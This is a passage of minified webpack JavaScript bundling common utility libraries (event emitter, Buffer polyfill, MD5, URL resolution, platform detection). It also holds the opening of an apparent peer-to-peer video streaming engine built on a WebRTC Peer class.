0===arguments.length?(this._events=Object.create(null),this._eventsCount=0):void 0!==r[e]&&(0==--this._eventsCount?this._events=Object.create(null):delete r[e]),this;if(0===arguments.length){var i,n=Object.keys(r);for(s=0;s<n.length;++s)"removeListener"!==(i=n[s])&&this.removeAllListeners(i);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if("function"==typeof(t=r[e]))this.removeListener(e,t);else if(void 0!==t)for(s=t.length-1;s>=0;s--)this.removeListener(e,t[s]);return this},n.prototype.listeners=function(e){return d(this,e,!0)},n.prototype.rawListeners=function(e){return d(this,e,!1)},n.listenerCount=function(e,t){return"function"==typeof e.listenerCount?e.listenerCount(t):f.call(e,t)},n.prototype.listenerCount=f,n.prototype.eventNames=function(){return this._eventsCount>0?t(this._events):[]}},622:function(e){var t,r,s,i,n;t=/^(?=((?:[a-zA-Z0-9+\-.]+:)?))\1(?=((?:\/\/[^\/?#]*)?))\2(?=((?:(?:[^?#\/]*\/)*[^;?#\/]*)?))\3((?:;[^?#]*)?)(\?[^#]*)?(#[^]*)?$/,r=/^(?=([^\/?#]*))\1([^]*)$/,s=/(?:\/|^)\.(?=\/)/g,i=/(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,n={buildAbsoluteURL:function(e,t,s){if(s=s||{},e=e.trim(),!(t=t.trim())){if(!s.alwaysNormalize)return e;var i=n.parseURL(e);if(!i)throw new Error("Error trying to parse base URL.");return i.path=n.normalizePath(i.path),n.buildURLFromParts(i)}var o=n.parseURL(t);if(!o)throw new Error("Error trying to parse relative URL.");if(o.scheme)return s.alwaysNormalize?(o.path=n.normalizePath(o.path),n.buildURLFromParts(o)):t;var a=n.parseURL(e);if(!a)throw new Error("Error trying to parse base URL.");if(!a.netLoc&&a.path&&"/"!==a.path[0]){var h=r.exec(a.path);a.netLoc=h[1],a.path=h[2]}a.netLoc&&!a.path&&(a.path="/");var c={scheme:a.scheme,netLoc:o.netLoc,path:null,params:o.params,query:o.query,fragment:o.fragment};if(!o.netLoc&&(c.netLoc=a.netLoc,"/"!==o.path[0]))if(o.path){var l=a.path,u=l.substring(0,l.lastIndexOf("/")+1)+o.path;c.path=n.normalizePath(u)}else c.path=a.path,o.params||(c.params=a.params,o.query||(c.query=a.query));return null===c.path&&(c.path=s.alwaysNormalize?n.normalizePath(o.path):o.path),n.buildURLFromParts(c)},parseURL:function(e){var r=t.exec(e);return r?{scheme:r[1]||"",netLoc:r[2]||"",path:r[3]||"",params:r[4]||"",query:r[5]||"",fragment:r[6]||""}:null},normalizePath:function(e){for(e=e.split("").reverse().join("").replace(s,"");e.length!==(e=e.replace(i,"")).length;);return e.split("").reverse().join("")},buildURLFromParts:function(e){return e.scheme+e.netLoc+e.path+e.params+e.query+e.fragment}},e.exports=n},47:(e,t)=>{"use strict";t.l=i;var r=2147483647;function s(e){if(e>r)throw new RangeError('The value "'+e+'" is invalid for option "size"');var t=new Uint8Array(e);return t.__proto__=i.prototype,t}function i(e,t,r){if("number"==typeof e){if("string"==typeof t)throw new TypeError('The "string" argument must be of type string. Received type number');return a(e)}return n(e,t,r)}function n(e,t,r){if("string"==typeof e)return function(e,t){"string"==typeof t&&""!==t||(t="utf8");if(!i.isEncoding(t))throw new TypeError("Unknown encoding: "+t);var r=0|l(e,t),n=s(r),o=n.write(e,t);o!==r&&(n=n.slice(0,o));return n}(e,t);if(ArrayBuffer.isView(e))return h(e);if(null==e)throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof e);if(m(e,ArrayBuffer)||e&&m(e.buffer,ArrayBuffer))return function(e,t,r){if(t<0||e.byteLength<t)throw new RangeError('"offset" is outside of buffer bounds');if(e.byteLength<t+(r||0))throw new RangeError('"length" is outside of buffer bounds');var s;s=void 0===t&&void 0===r?new Uint8Array(e):void 0===r?new Uint8Array(e,t):new Uint8Array(e,t,r);return s.__proto__=i.prototype,s}(e,t,r);if("number"==typeof e)throw new TypeError('The "value" argument must not be of type number. Received type number');var n=e.valueOf&&e.valueOf();if(null!=n&&n!==e)return i.from(n,t,r);var o=function(e){if(i.isBuffer(e)){var t=0|c(e.length),r=s(t);return 0===r.length||e.copy(r,0,0,t),r}if(void 0!==e.length)return"number"!=typeof e.length||E(e.length)?s(0):h(e);if("Buffer"===e.type&&Array.isArray(e.data))return h(e.data)}(e);if(o)return o;if("undefined"!=typeof Symbol&&null!=Symbol.toPrimitive&&"function"==typeof e[Symbol.toPrimitive])return i.from(e[Symbol.toPrimitive]("string"),t,r);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof e)}function o(e){if("number"!=typeof e)throw new TypeError('"size" argument must be of type number');if(e<0)throw new RangeError('The value "'+e+'" is invalid for option "size"')}function a(e){return o(e),s(e<0?0:0|c(e))}function h(e){for(var t=e.length<0?0:0|c(e.length),r=s(t),i=0;i<t;i+=1)r[i]=255&e[i];return r}function c(e){if(e>=r)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+r.toString(16)+" bytes");return 0|e}function l(e,t){if(i.isBuffer(e))return e.length;if(ArrayBuffer.isView(e)||m(e,ArrayBuffer))return e.byteLength;if("string"!=typeof e)throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof e);var r=e.length,s=arguments.length>2&&!0===arguments[2];if(!s&&0===r)return 0;for(var n=!1;;)switch(t){case"ascii":case"latin1":case"binary":return r;case"utf8":case"utf-8":return g(e).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*r;case"hex":return r>>>1;default:if(n)return s?-1:g(e).length;t=(""+t).toLowerCase(),n=!0}}function u(e,t,r,s){r=Number(r)||0;const i=e.length-r;s?(s=Number(s))>i&&(s=i):s=i;const n=t.length;let o;for(s>n/2&&(s=n/2),o=0;o<s;++o){const s=parseInt(t.substr(2*o,2),16);if(E(s))return o;e[r+o]=s}return o}function d(e,t,r,s){return p(g(t,e.length-r),e,r,s)}function f(e,t,r,s){return p(function(e){const t=[];for(let r=0;r<e.length;++r)t.push(255&e.charCodeAt(r));return t}(t),e,r,s)}function _(e,t,r,s){return p(function(e,t){let r,s,i;const n=[];for(let o=0;o<e.length&&!((t-=2)<0);++o)r=e.charCodeAt(o),s=r>>8,i=r%256,n.push(i),n.push(s);return n}(t,e.length-r),e,r,s)}function p(e,t,r,s){let i;for(i=0;i<s&&!(i+r>=t.length||i>=e.length);++i)t[i+r]=e[i];return i}function g(e,t){var r;t=t||1/0;for(var s=e.length,i=null,n=[],o=0;o<s;++o){if((r=e.charCodeAt(o))>55295&&r<57344){if(!i){if(r>56319){(t-=3)>-1&&n.push(239,191,189);continue}if(o+1===s){(t-=3)>-1&&n.push(239,191,189);continue}i=r;continue}if(r<56320){(t-=3)>-1&&n.push(239,191,189),i=r;continue}r=65536+(i-55296<<10|r-56320)}else i&&(t-=3)>-1&&n.push(239,191,189);if(i=null,r<128){if((t-=1)<0)break;n.push(r)}else if(r<2048){if((t-=2)<0)break;n.push(r>>6|192,63&r|128)}else if(r<65536){if((t-=3)<0)break;n.push(r>>12|224,r>>6&63|128,63&r|128)}else{if(!(r<1114112))throw new Error("Invalid code point");if((t-=4)<0)break;n.push(r>>18|240,r>>12&63|128,r>>6&63|128,63&r|128)}}return n}function m(e,t){return e instanceof t||null!=e&&null!=e.constructor&&null!=e.constructor.name&&e.constructor.name===t.name}function E(e){return e!=e}"undefined"!=typeof Symbol&&null!=Symbol.species&&i[Symbol.species]===i&&Object.defineProperty(i,Symbol.species,{value:null,configurable:!0,enumerable:!1,writable:!1}),i.from=function(e,t,r){return n(e,t,r)},i.prototype.__proto__=Uint8Array.prototype,i.__proto__=Uint8Array,i.alloc=function(e,t,r){return function(e,t,r){return o(e),e<=0?s(e):void 0!==t?"string"==typeof r?s(e).fill(t,r):s(e).fill(t):s(e)}(e,t,r)},i.allocUnsafe=function(e){return a(e)},i.isBuffer=function(e){return null!=e&&!0===e._isBuffer&&e!==i.prototype},i.isEncoding=function(e){switch(String(e).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},i.concat=function(e,t){if(!Array.isArray(e))throw new TypeError('"list" argument must be an Array of Buffers');if(0===e.length)return i.alloc(0);var r;if(void 0===t)for(t=0,r=0;r<e.length;++r)t+=e[r].length;var s=i.allocUnsafe(t),n=0;for(r=0;r<e.length;++r){var o=e[r];if(m(o,Uint8Array)&&(o=i.from(o)),!i.isBuffer(o))throw new TypeError('"list" argument must be an Array of Buffers');o.copy(s,n),n+=o.length}return s},i.byteLength=l,i.prototype._isBuffer=!0,i.prototype.copy=function(e,t,r,s){if(!i.isBuffer(e))throw new TypeError("argument should be a Buffer");if(r||(r=0),s||0===s||(s=this.length),t>=e.length&&(t=e.length),t||(t=0),s>0&&s<r&&(s=r),s===r)return 0;if(0===e.length||0===this.length)return 0;if(t<0)throw new RangeError("targetStart out of bounds");if(r<0||r>=this.length)throw new RangeError("Index out of range");if(s<0)throw new RangeError("sourceEnd out of bounds");s>this.length&&(s=this.length),e.length-t<s-r&&(s=e.length-t+r);var n=s-r;if(this===e&&"function"==typeof Uint8Array.prototype.copyWithin)this.copyWithin(t,r,s);else if(this===e&&r<t&&t<s)for(var o=n-1;o>=0;--o)e[o+t]=this[o+r];else Uint8Array.prototype.set.call(e,this.subarray(r,s),t);return n},i.prototype.write=function(e,t,r,s){if(void 0===t)s="utf8",r=this.length,t=0;else if(void 0===r&&"string"==typeof t)s=t,r=this.length,t=0;else{if(!isFinite(t))throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");t>>>=0,isFinite(r)?(r>>>=0,void 0===s&&(s="utf8")):(s=r,r=void 0)}const i=this.length-t;if((void 0===r||r>i)&&(r=i),e.length>0&&(r<0||t<0)||t>this.length)throw new RangeError("Attempt to write outside buffer bounds");s||(s="utf8");let n=!1;for(;;)switch(s){case"hex":return u(this,e,t,r);case"utf8":case"utf-8":return d(this,e,t,r);case"ascii":case"latin1":case"binary":return f(this,e,t,r);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return _(this,e,t,r);default:if(n)throw new TypeError("Unknown encoding: "+s);s=(""+s).toLowerCase(),n=!0}}},934:e=>{"use strict";function t(e,t){for(const r in t)Object.defineProperty(e,r,{value:t[r],enumerable:!0,configurable:!0});return e}e.exports=function(e,r,s){if(!e||"string"==typeof e)throw new TypeError("Please pass an Error to err-code");s||(s={}),"object"==typeof r&&(s=r,r=void 0),null!=r&&(s.code=r);try{return t(e,s)}catch(r){s.message=e.message,s.stack=e.stack;const i=function(){};return i.prototype=Object.create(Object.getPrototypeOf(e)),t(new i,s)}}},485:function(e,t,r){var s;!function(i){"use strict";function n(e,t){var r=(65535&e)+(65535&t);return(e>>16)+(t>>16)+(r>>16)<<16|65535&r}function o(e,t,r,s,i,o){return n((a=n(n(t,e),n(s,o)))<<(h=i)|a>>>32-h,r);var a,h}function a(e,t,r,s,i,n,a){return o(t&r|~t&s,e,t,i,n,a)}function h(e,t,r,s,i,n,a){return o(t&s|r&~s,e,t,i,n,a)}function c(e,t,r,s,i,n,a){return o(t^r^s,e,t,i,n,a)}function l(e,t,r,s,i,n,a){return o(r^(t|~s),e,t,i,n,a)}function u(e,t){var r,s,i,o,u;e[t>>5]|=128<<t%32,e[14+(t+64>>>9<<4)]=t;var d=1732584193,f=-271733879,_=-1732584194,p=271733878;for(r=0;r<e.length;r+=16)s=d,i=f,o=_,u=p,d=a(d,f,_,p,e[r],7,-680876936),p=a(p,d,f,_,e[r+1],12,-389564586),_=a(_,p,d,f,e[r+2],17,606105819),f=a(f,_,p,d,e[r+3],22,-1044525330),d=a(d,f,_,p,e[r+4],7,-176418897),p=a(p,d,f,_,e[r+5],12,1200080426),_=a(_,p,d,f,e[r+6],17,-1473231341),f=a(f,_,p,d,e[r+7],22,-45705983),d=a(d,f,_,p,e[r+8],7,1770035416),p=a(p,d,f,_,e[r+9],12,-1958414417),_=a(_,p,d,f,e[r+10],17,-42063),f=a(f,_,p,d,e[r+11],22,-1990404162),d=a(d,f,_,p,e[r+12],7,1804603682),p=a(p,d,f,_,e[r+13],12,-40341101),_=a(_,p,d,f,e[r+14],17,-1502002290),d=h(d,f=a(f,_,p,d,e[r+15],22,1236535329),_,p,e[r+1],5,-165796510),p=h(p,d,f,_,e[r+6],9,-1069501632),_=h(_,p,d,f,e[r+11],14,643717713),f=h(f,_,p,d,e[r],20,-373897302),d=h(d,f,_,p,e[r+5],5,-701558691),p=h(p,d,f,_,e[r+10],9,38016083),_=h(_,p,d,f,e[r+15],14,-660478335),f=h(f,_,p,d,e[r+4],20,-405537848),d=h(d,f,_,p,e[r+9],5,568446438),p=h(p,d,f,_,e[r+14],9,-1019803690),_=h(_,p,d,f,e[r+3],14,-187363961),f=h(f,_,p,d,e[r+8],20,1163531501),d=h(d,f,_,p,e[r+13],5,-1444681467),p=h(p,d,f,_,e[r+2],9,-51403784),_=h(_,p,d,f,e[r+7],14,1735328473),d=c(d,f=h(f,_,p,d,e[r+12],20,-1926607734),_,p,e[r+5],4,-378558),p=c(p,d,f,_,e[r+8],11,-2022574463),_=c(_,p,d,f,e[r+11],16,1839030562),f=c(f,_,p,d,e[r+14],23,-35309556),d=c(d,f,_,p,e[r+1],4,-1530992060),p=c(p,d,f,_,e[r+4],11,1272893353),_=c(_,p,d,f,e[r+7],16,-155497632),f=c(f,_,p,d,e[r+10],23,-1094730640),d=c(d,f,_,p,e[r+13],4,681279174),p=c(p,d,f,_,e[r],11,-358537222),_=c(_,p,d,f,e[r+3],16,-722521979),f=c(f,_,p,d,e[r+6],23,76029189),d=c(d,f,_,p,e[r+9],4,-640364487),p=c(p,d,f,_,e[r+12],11,-421815835),_=c(_,p,d,f,e[r+15],16,530742520),d=l(d,f=c(f,_,p,d,e[r+2],23,-995338651),_,p,e[r],6,-198630844),p=l(p,d,f,_,e[r+7],10,1126891415),_=l(_,p,d,f,e[r+14],15,-1416354905),f=l(f,_,p,d,e[r+5],21,-57434055),d=l(d,f,_,p,e[r+12],6,1700485571),p=l(p,d,f,_,e[r+3],10,-1894986606),_=l(_,p,d,f,e[r+10],15,-1051523),f=l(f,_,p,d,e[r+1],21,-2054922799),d=l(d,f,_,p,e[r+8],6,1873313359),p=l(p,d,f,_,e[r+15],10,-30611744),_=l(_,p,d,f,e[r+6],15,-1560198380),f=l(f,_,p,d,e[r+13],21,1309151649),d=l(d,f,_,p,e[r+4],6,-145523070),p=l(p,d,f,_,e[r+11],10,-1120210379),_=l(_,p,d,f,e[r+2],15,718787259),f=l(f,_,p,d,e[r+9],21,-343485551),d=n(d,s),f=n(f,i),_=n(_,o),p=n(p,u);return[d,f,_,p]}function d(e){var t,r="",s=32*e.length;for(t=0;t<s;t+=8)r+=String.fromCharCode(e[t>>5]>>>t%32&255);return r}function f(e){var t,r=[];for(r[(e.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var s=8*e.length;for(t=0;t<s;t+=8)r[t>>5]|=(255&e.charCodeAt(t/8))<<t%32;return r}function _(e){var t,r,s="0123456789abcdef",i="";for(r=0;r<e.length;r+=1)t=e.charCodeAt(r),i+=s.charAt(t>>>4&15)+s.charAt(15&t);return i}function p(e){return unescape(encodeURIComponent(e))}function g(e){return function(e){return d(u(f(e),8*e.length))}(p(e))}function m(e,t){return function(e,t){var r,s,i=f(e),n=[],o=[];for(n[15]=o[15]=void 0,i.length>16&&(i=u(i,8*e.length)),r=0;r<16;r+=1)n[r]=909522486^i[r],o[r]=1549556828^i[r];return s=u(n.concat(f(t)),512+8*t.length),d(u(o.concat(s),640))}(p(e),p(t))}function E(e,t,r){return t?r?m(t,e):_(m(t,e)):r?g(e):_(g(e))}void 0===(s=function(){return E}.call(t,r,t,e))||(e.exports=s)}()},422:e=>{const t={ANDROID_WEB:"android-web",IOS_WEB:"iOS-web",PC_NATIVE:"PC-native",PC_WEB:"PC-web"};var r={getNetType:function(){let e=(new RegExp("nettype\\/(\\w*)").exec(s())||[,""])[1].toLowerCase();if(!e&&navigator.connection){switch(navigator.connection.type){case"ethernet":e="ethernet";break;case"cellular":e="cellular";break;default:e="wifi"}}return e},getPlatform:function(){return r.isAndroid()?t.ANDROID_WEB:r.isIOS()?t.IOS_WEB:r.isElectron()?t.PC_NATIVE:t.PC_WEB},isX5:function(){return this.isAndroid()&&/\s(TBS|X5Core)\/[\w\.\-]+/i.test(s())},isPC:function(){return!n(i("os "))&&!n(i("android[/ ]"))},isIOS:function(){return n(i("os "))},isAndroid:function(){return n(i("android[/ ]"))},isIOSSafari:function(){return this.isIOS()&&this.isSafari()},isElectron:function(){return/electron/i.test(s())},isMobile:function(){return r.isAndroid()||r.isIOS()},isSafari:function(){return/^((?!chrome|android).)*safari/i.test(s())},isFirefox:function(){return/firefox/i.test(s())},isChrome:function(){return/chrome/i.test(s())},isLocalHost:function(){return"localhost"===location.hostname},device:t,getBrowser:function(){return r.isX5()?"X5":r.isChrome()?"Chrome":r.isFirefox()?"Firefox":r.isIOSSafari()?"iOS-Safari":r.isSafari()?"Mac-Safari":"Unknown"}};function s(){return navigator.userAgent.toLowerCase()}function i(e){return""+(new RegExp(e+"(\\d+((\\.|_)\\d+)*)").exec(s())||[,0])[1]||void 0}function n(e){return parseFloat((e||"").replace(/\_/g,"."))||0}e.exports=r},77:e=>{let t;e.exports="function"==typeof queueMicrotask?queueMicrotask.bind(globalThis):e=>(t||(t=Promise.resolve())).then(e).catch((e=>setTimeout((()=>{throw e}),0)))}},__webpack_module_cache__={};function __webpack_require__(e){var t=__webpack_module_cache__[e];if(void 0!==t)return t.exports;var r=__webpack_module_cache__[e]={exports:{}};return __webpack_modules__[e].call(r.exports,r,r.exports,__webpack_require__),r.exports}__webpack_require__.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return __webpack_require__.d(t,{a:t}),t},__webpack_require__.d=(e,t)=>{for(var r in t)__webpack_require__.o(t,r)&&!__webpack_require__.o(e,r)&&Object.defineProperty(e,r,{enumerable:!0,get:t[r]})},__webpack_require__.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),__webpack_require__.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t);var __webpack_exports__={};return(()=>{"use strict";__webpack_require__.d(__webpack_exports__,{default:()=>index_engine});var utils_buffer=__webpack_require__(47);const CHECK_PEERS_INTERVAL=3,DEFAULT_PACKET_SIZE=64e3;function noop(){return!0}function getQueryParam(e){return new URL(location.href).searchParams.get(e)}function updateQueryStringParam(e,t,r){var s=new RegExp("([?&])"+t+"=.*?(&|$)","i"),i=-1!==e.indexOf("?")?"&":"?";return e.match(s)?e.replace(s,"$1"+t+"="+r+"$2"):e+i+t+"="+r}function getCurrentTs(){return Date.parse(new Date)/1e3}function randomNum(e,t){return parseInt(Math.random()*(t-e+1)+e,10)}function calCheckPeersDelay(e){return 0===e?CHECK_PEERS_INTERVAL:.5*e+1.67}function performRangeRequest(e,t,r,s=3500){const i=new XMLHttpRequest;return new Promise(((n,o)=>{i.open("GET",e,!0),i.responseType="arraybuffer",i.timeout=s,i.onreadystatechange=e=>{if(4===i.readyState){const e=i.status;206===e?n(i.response):o(`status ${e}`)}},i.onerror=e=>{o("request error")},i.ontimeout=e=>{o("timeout")},i.setRequestHeader("Range",t||"bytes=0-0"),r&&r(i,e),i.send()})).catch((e=>{}))}function navLang(){return"zh-CN"===(navigator.language||navigator.userLanguage)?"cn":"en"}function dontWaitFor(e){e.then((()=>{}))}function timeout(e){return new Promise((t=>setTimeout(t,e)))}function getBrowserRTC(){if("undefined"==typeof window)return null;var e={RTCPeerConnection:window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection,RTCSessionDescription:window.RTCSessionDescription||window.mozRTCSessionDescription||window.webkitRTCSessionDescription,RTCIceCandidate:window.RTCIceCandidate||window.mozRTCIceCandidate||window.webkitRTCIceCandidate};return e.RTCPeerConnection?e:null}function copyBuffer(e){const t=Buffer.from(e),r=new Buffer(e.byteLength);return t.copy(r),r}function getMaxSequence(e){const t=e.split("\n");let r=0;let s=0;for(let e of t){const t=/^#EXT-X-MEDIA-SEQUENCE:?(\-?[0-9.]*)?/.exec(e);if(t&&t[1]){r=parseInt(t[1],10);break}}for(let e of t)e.startsWith("#EXTINF")&&s++;return r+s-1}function isHttps(){return location.protocol.startsWith("https")}function isInteger(e){return"number"==typeof e&&e%1==0}function getHomeUrl(){return window.atob("aHR0cHM6Ly9zd2FybWNsb3VkLm5ldC9lbi8=")}function splitBytes(e,t){const r=e.byteLength-t,s=[];let i=t,n=Math.floor(r/DEFAULT_PACKET_SIZE),o=r%DEFAULT_PACKET_SIZE;for(let t=0;t<n;t++){const t=(0,utils_buffer.l)(DEFAULT_PACKET_SIZE);e.copy(t,0,i,i+DEFAULT_PACKET_SIZE),s.push(t),i+=DEFAULT_PACKET_SIZE}if(o>0){const t=(0,utils_buffer.l)(o);e.copy(t,0,i,i+o),s.push(t)}return s}function getAvailableMemory(){const{memory:e}=performance;return e?e.jsHeapSizeLimit-e.usedJSHeapSize:-1}function trimMap(e,t){if(e.size<=t)return;const r=[...e.keys()];do{e.delete(r.shift())}while(e.size>t)}function trimSet(e,t){if(e.size<=t)return;const r=[...e.values()];do{e.delete(r.shift())}while(e.size>t)}var events=__webpack_require__(204),events_default=__webpack_require__.n(events),queue_microtask=__webpack_require__(77),queue_microtask_default=__webpack_require__.n(queue_microtask);const MAX_BUFFERED_AMOUNT=65536,ICECOMPLETE_TIMEOUT=5e3,CHANNEL_CLOSING_TIMEOUT=5e3;function filterTrickle(e){return e.replace(/a=ice-options:trickle\s\n/g,"")}function warn(e){console.warn(e)}class Peer extends(events_default()){constructor(e){super(),this.channelName=e.initiator?e.channelName:null,this.initiator=e.initiator||!1,this.channelConfig=e.channelConfig||Peer.channelConfig,this.channelNegotiated=this.channelConfig.negotiated,this.config=Object.assign({},Peer.config,e.config),this.offerOptions=e.offerOptions||{},this.answerOptions=e.answerOptions||{},this.sdpTransform=e.sdpTransform||(e=>e),this.trickle=void 0===e.trickle||e.trickle,this.allowHalfTrickle=void 0!==e.allowHalfTrickle&&e.allowHalfTrickle,this.iceCompleteTimeout=e.iceCompleteTimeout||ICECOMPLETE_TIMEOUT,this.destroyed=!1,this.destroying=!1,this._connected=!1,this.remoteAddress=void 0,this.remoteFamily=void 0,this.remotePort=void 0,this.localAddress=void 0,this.localFamily=void 0,this.localPort=void 0,this._wrtc=e.wrtc&&"object"==typeof e.wrtc?e.wrtc:getBrowserRTC(),this._pcReady=!1,this._channelReady=!1,this._iceComplete=!1,this._iceCompleteTimer=null,this._channel=null,this._pendingCandidates=[],this._isNegotiating=!1,this._firstNegotiation=!0,this._batchedNegotiation=!1,this._queuedNegotiation=!1,this._sendersAwaitingStable=[],this._senderMap=new Map,this._closingInterval=null,this._chunk=null,this._cb=null,this._interval=null;try{this._pc=new this._wrtc.RTCPeerConnection(this.config)}catch(e){return void queue_microtask_default()((()=>this.destroy(e)))}this._isReactNativeWebrtc="number"==typeof this._pc._peerConnectionId,this._pc.oniceconnectionstatechange=()=>{this._onIceStateChange()},this._pc.onicegatheringstatechange=()=>{this._onIceStateChange()},this._pc.onconnectionstatechange=()=>{this._onConnectionStateChange()},this._pc.onsignalingstatechange=()=>{this._onSignalingStateChange()},this._pc.onicecandidate=e=>{this._onIceCandidate(e)},this.initiator||this.channelNegotiated?this._setupData({channel:this._pc.createDataChannel(this.channelName,this.channelConfig)}):this._pc.ondatachannel=e=>{this._setupData(e)},this._needsNegotiation()}get bufferSize(){return this._channel&&this._channel.bufferedAmount||0}get connected(){return this._connected&&"open"===this._channel.readyState}signal(e){if(this.destroyed)throw new Error("cannot signal after peer is destroyed");if("string"==typeof e)try{e=JSON.parse(e)}catch(t){e={}}e.renegotiate&&this.initiator&&this._needsNegotiation(),e.candidate&&(this._pc.remoteDescription&&this._pc.remoteDescription.type?this._addIceCandidate(e.candidate):this._pendingCandidates.push(e.candidate)),e.sdp&&this._pc.setRemoteDescription(new this._wrtc.RTCSessionDescription(e)).then((()=>{this.destroyed||(this._pendingCandidates.forEach((e=>{this._addIceCandidate(e)})),this._pendingCandidates=[],"offer"===this._pc.remoteDescription.type&&this._createAnswer())})).catch((e=>{this.destroy(e)})),e.sdp||e.candidate||e.renegotiate||e.transceiverRequest||this.destroy(new Error("signal() called with invalid signal data"))}_addIceCandidate(e){const t=new this._wrtc.RTCIceCandidate(e);this._pc.addIceCandidate(t).catch((e=>{!t.address||t.address.endsWith(".local")?warn("Ignoring unsupported ICE candidate."):this.destroy(e)}))}send(e){this._channel.send(e)}_needsNegotiation(){this._batchedNegotiation||(this._batchedNegotiation=!0,queue_microtask_default()((()=>{this._batchedNegotiation=!1,!this.initiator&&this._firstNegotiation||this.negotiate(),this._firstNegotiation=!1})))}negotiate(){this.initiator?this._isNegotiating?this._queuedNegotiation=!0:setTimeout((()=>{this._createOffer()}),0):this._isNegotiating?this._queuedNegotiation=!0:this.emit("signal",{type:"renegotiate",renegotiate:!0}),this._isNegotiating=!0}destroy(e){this._destroy(e)}_destroy(e){this.destroyed||this.destroying||(this.destroying=!0,queue_microtask_default()((()=>{if(this.destroyed=!0,this.destroying=!1,this._connected=!1,this._pcReady=!1,this._channelReady=!1,this._senderMap=null,clearInterval(this._closingInterval),this._closingInterval=null,clearInterval(this._interval),this._interval=null,this._chunk=null,this._cb=null,this._channel){try{this._channel.close()}catch(e){}this._channel.onmessage=null,this._channel.onopen=null,this._channel.onclose=null,this._channel.onerror=null}if(this._pc){try{this._pc.close()}catch(e){}this._pc.oniceconnectionstatechange=null,this._pc.onicegatheringstatechange=null,this._pc.onsignalingstatechange=null,this._pc.onicecandidate=null,this._pc.ondatachannel=null}this._pc=null,this._channel=null,e&&this.emit("error",e),this.emit("close")})))}_setupData(e){if(!e.channel)return this.destroy(new Error("Data channel event is missing `channel` property"));this._channel=e.channel,this._channel.binaryType="arraybuffer","number"==typeof this._channel.bufferedAmountLowThreshold&&(this._channel.bufferedAmountLowThreshold=MAX_BUFFERED_AMOUNT),this.channelName=this._channel.label,this._channel.onmessage=e=>{this._onChannelMessage(e)},this._channel.onbufferedamountlow=()=>{this._onChannelBufferedAmountLow()},this._channel.onopen=()=>{this._onChannelOpen()},this._channel.onclose=()=>{this._onChannelClose()},this._channel.onerror=e=>{this.destroy(e)};let t=!1;this._closingInterval=setInterval((()=>{this._channel&&"closing"===this._channel.readyState?(t&&this._onChannelClose(),t=!0):t=!1}),CHANNEL_CLOSING_TIMEOUT)}get isBufferedAmountHigh(){return this._channel.bufferedAmount>MAX_BUFFERED_AMOUNT}write(e,t){if(this.destroyed)return t(new Error("cannot write after peer is destroyed"));if(this._connected){try{this.send(e)}catch(e){return this.destroy(e)}this.isBufferedAmountHigh?this._cb=t:t(null)}else this._chunk=e,this._cb=t}_startIceCompleteTimeout(){this.destroyed||this._iceCompleteTimer||(this._iceCompleteTimer=setTimeout((()=>{this._iceComplete||(this._iceComplete=!0,this.emit("iceTimeout"),this.emit("_iceComplete"))}),this.iceCompleteTimeout))}_createOffer(){this.destroyed||this._pc.createOffer(this.offerOptions).then((e=>{if(this.destroyed)return;this.trickle||this.allowHalfTrickle||(e.sdp=filterTrickle(e.sdp)),e.sdp=this.sdpTransform(e.sdp);const t=()=>{if(this.destroyed)return;const t=this._pc.localDescription||e;this.emit("signal",{type:t.type,sdp:t.sdp})};this._pc.setLocalDescription(e).then((()=>{this.destroyed||(this.trickle||this._iceComplete?t():this.once("_iceComplete",t))})).catch((e=>{this.destroy(e)}))})).catch((e=>{this.destroy(e)}))}_createAnswer(){this.destroyed||this._pc.createAnswer(this.answerOptions).then((e=>{if(this.destroyed)return;this.trickle||this.allowHalfTrickle||(e.sdp=filterTrickle(e.sdp)),e.sdp=this.sdpTransform(e.sdp);const t=()=>{if(this.destroyed)return;const t=this._pc.localDescription||e;this.emit("signal",{type:t.type,sdp:t.sdp})};this._pc.setLocalDescription(e).then((()=>{this.destroyed||(this.trickle||this._iceComplete?t():this.once("_iceComplete",t))})).catch((e=>{this.destroy(e)}))})).catch((e=>{this.destroy(e)}))}_onConnectionStateChange(){this.destroyed||"failed"===this._pc.connectionState&&this.destroy(new Error("Connection failed."))}_onIceStateChange(){if(this.destroyed)return;const e=this._pc.iceConnectionState,t=this._pc.iceGatheringState;this.emit("iceStateChange",e,t),"connected"!==e&&"completed"!==e||(this._pcReady=!0,this._maybeReady()),"failed"===e&&this.destroy(new Error("Ice connection failed.")),"closed"===e&&this.destroy(new Error("Ice connection closed."))}getStats(e){const t=e=>("[object Array]"===Object.prototype.toString.call(e.values)&&e.values.forEach((t=>{Object.assign(e,t)})),e);0===this._pc.getStats.length||this._isReactNativeWebrtc?this._pc.getStats().then((r=>{const s=[];r.forEach((e=>{s.push(t(e))})),e(null,s)}),(t=>e(t))):this._pc.getStats.length>0?this._pc.getStats((r=>{if(this.destroyed)return;const s=[];r.result().forEach((e=>{const r={};e.names().forEach((t=>{r[t]=e.stat(t)})),r.id=e.id,r.type=e.type,r.timestamp=e.timestamp,s.push(t(r))})),e(null,s)}),(t=>e(t))):e(null,[])}_maybeReady(){if(this._connected||this._connecting||!this._pcReady||!this._channelReady)return;this._connecting=!0;const e=()=>{this.destroyed||this.getStats(((t,r)=>{if(this.destroyed)return;t&&(r=[]);const s={},i={},n={};let 